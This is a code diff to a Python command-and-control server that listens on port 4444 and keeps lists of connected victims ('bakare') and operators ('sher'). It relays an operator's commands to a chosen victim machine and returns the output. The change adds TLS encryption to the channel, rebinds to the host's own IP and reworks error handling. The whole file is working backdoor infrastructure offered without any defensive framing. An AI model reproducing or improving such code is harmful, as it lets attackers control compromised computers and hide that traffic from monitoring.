@@ -1,9 +1,10 @@
 import socket,json
 import threading,time
-
+import ssl
 active_bakare={}
 active_sher=[]
-IP="10.1.185.174"
+# IP='localhost'
+IP=socket.gethostbyname(socket.gethostname())
 PORT=4444
 
 def reliable_send(data,connection):
@@ -15,31 +16,29 @@ def reliable_receive(connection):
     while True:
         try:
             json_data=json_data+connection.recv(1024).decode("utf-8")
+            print(json_data)
             return json.loads(json_data)
         except ValueError:
             continue
 
 def handle_sher(sher_socket):
+    print("inside handle_sher")
     while len(active_bakare)==0:
         reliable_send("No bakara is connected\nRefreshing list in 10 seconds",sher_socket)
         time.sleep(10)
-    print(active_bakare)
     bakare=list(active_bakare.keys())
-    print(bakare)
     reliable_send(bakare,sher_socket)
     n=reliable_receive(sher_socket)
     while True:
         try:
             while len(active_bakare)==0:
-                reliable_send("No bakara is connected\nRefreshing list in 10 seconds",sher_socket)
-                time.sleep(10)
+                reliable_send("[-] Bakara Disconnected",sher_socket)
+                handle_sher(sher_socket)
             command=reliable_receive(sher_socket)
             if command[0]=="change_bakara":
                 reliable_send(list(active_bakare.keys()),sher_socket)
                 n=reliable_receive(sher_socket)
                 continue
-            print(n,command)
-            print(type(n),type(command))
             reliable_send(command,active_bakare[n])
             reliable_send(reliable_receive(active_bakare[n]),sher_socket)
         except ConnectionResetError:
@@ -49,6 +48,14 @@ def handle_sher(sher_socket):
             except:
                 active_sher.remove(sher_socket)
                 break
+        except Exception as e:
+            print(e)
+            break
+
+context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
+context.minimum_version = ssl.TLSVersion.TLSv1_2
+context.maximum_version = ssl.TLSVersion.TLSv1_3
+context.load_cert_chain(certfile="server-cert.pem", keyfile="server-key.pem")
 listener=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
 listener.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
 listener.bind((IP,PORT))
@@ -56,6 +63,7 @@ listener.listen(5)
 print("[+] Waiting for incoming connections")
 while True:
     connection,addr=listener.accept()
+    connection = context.wrap_socket(connection, server_side=True)
     print("[+] Got a connection from " + str(addr))
     if reliable_receive(connection)=="sher":
         sher_thread=threading.Thread(target=handle_sher,args=(connection,))
